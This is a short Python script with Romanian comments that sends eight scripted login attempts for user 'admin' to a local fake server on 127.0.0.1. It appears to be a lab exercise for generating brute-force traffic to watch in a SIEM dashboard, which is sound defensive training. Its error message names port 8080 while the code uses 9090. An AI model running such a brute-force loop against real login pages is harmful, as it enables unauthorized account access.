import socket
import time

tinta = "127.0.0.1"
port_tinta = 9090  # Țintim serverul fals pe care tocmai l-ai pornit

print("[*] Lansăm atacul automatizat Brute-Force (Dicționar de Parole)...")

for i in range(1, 9):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((tinta, port_tinta))

        payload = f"POST /login.php HTTP/1.1\r\nHost: {tinta}\r\n\r\nusername=admin&password=hacker_pass_{i}"

        # Trimitem textul curat în rețea
        s.send(payload.encode())
        s.close()

        print(f" -> Încercarea {i} trimisă: admin / hacker_pass_{i}")
    except Exception as e:
        print(f" -> [!] Eroare la conectare (Ai uitat să pornești python -m http.server 8080?): {e}")

    time.sleep(0.3)  # Pauza roboțelului

print("[+] Dicționar epuizat. Verifică Dashboard-ul SIEM-ului!")